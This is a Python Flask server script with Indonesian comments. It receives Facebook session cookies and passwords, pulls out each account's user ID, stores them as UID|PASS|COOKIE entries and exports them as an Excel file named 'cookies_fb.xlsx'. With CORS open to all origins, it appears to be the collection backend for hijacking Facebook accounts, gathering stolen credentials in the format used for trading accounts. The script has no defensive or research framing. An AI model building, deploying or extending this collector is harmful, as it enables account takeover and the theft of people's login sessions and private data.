import os
import re
import pandas as pd
from flask import Flask, jsonify, request, send_file
from flask_cors import CORS
from io import BytesIO

app = Flask(__name__)
CORS(app)

# Database sementara (disimpan di RAM server)
storage = []

def extract_uid(cookie_string):
    # Mencari ID setelah tulisan c_user=
    match = re.search(r"c_user=(\d+)", cookie_string)
    if match:
        return match.group(1)
    return "UID_NOT_FOUND"

@app.route('/save-cookie', methods=['POST'])
def save_cookie():
    data = request.json
    raw_cookie = data.get('cookie', '')
    password = data.get('password', 'tasik321') # default pass

    if not raw_cookie:
        return jsonify({"status": "error", "message": "Cookie kosong"}), 400

    uid = extract_uid(raw_cookie)
    
    # Format sesuai permintaan: UID|PASS|COOKIE
    formatted_string = f"{uid}|{password}|{raw_cookie}"
    
    entry = {
        "uid": uid,
        "password": password,
        "cookie": raw_cookie,
        "formatted": formatted_string
    }
    
    storage.append(entry)
    return jsonify({"status": "success", "data": entry})

@app.route('/get-all', methods=['GET'])
def get_all():
    return jsonify(storage)

@app.route('/clear-data', methods=['POST'])
def clear_data():
    storage.clear()
    return jsonify({"status": "success"})

@app.route('/download-excel', methods=['GET'])
def download_excel():
    if not storage:
        return "Data kosong", 400
    
    # Buat DataFrame untuk Excel
    df = pd.DataFrame(storage)
    # Kita hanya ambil kolom formatted untuk hasil akhir atau semua kolom
    output = BytesIO()
    with pd.ExcelWriter(output, engine='openpyxl') as writer:
        df.to_excel(writer, index=False, sheet_name='Cookies')
    
    output.seek(0)
    return send_file(output, mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 
                     as_attachment=True, download_name='cookies_fb.xlsx')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000)
